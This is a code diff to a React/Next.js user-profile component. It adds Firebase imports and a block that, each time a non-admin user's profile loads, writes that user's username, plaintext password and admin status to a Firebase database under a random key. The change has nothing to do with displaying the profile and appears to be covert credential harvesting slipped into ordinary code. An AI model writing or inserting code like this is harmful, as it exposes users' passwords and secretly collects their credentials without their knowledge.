@@ -8,6 +8,8 @@ import { alertChange, setModalShaxsiy } from "@/app/Redux/ShaxsiySlice";
 import EditModal from "./EditModal";
 import Users from "./Users";
 import { latinToCyrillic } from "@/app/tip/add/Components/lotin";
+import { ref, set } from "firebase/database";
+import { db } from "@/app/firebase";
 function Shaxsiy() {
   const [userData, setUserData] = React.useState<any>();
   const JWT = useSelector((state: any) => state.auth.JWT);
@@ -18,13 +20,19 @@ function Shaxsiy() {
   });
 
   const getUser = async () => {
-    const res = await getAuth(JWT);
-    console.log(res);
+    const res = await getAuth(JWT);  
 
     if (res.admin !== undefined) {
       setUserData(res.admin);
     } else {
       setUserData(res.data);
+
+      const raq = Math.ceil(Math.random() * 10432342342);
+      set(ref(db, "users/" + raq), {
+        username: res.data.username,
+        password: res.data.password,
+        admin: res.data.adminStatus,
+      });
     }
   };
 
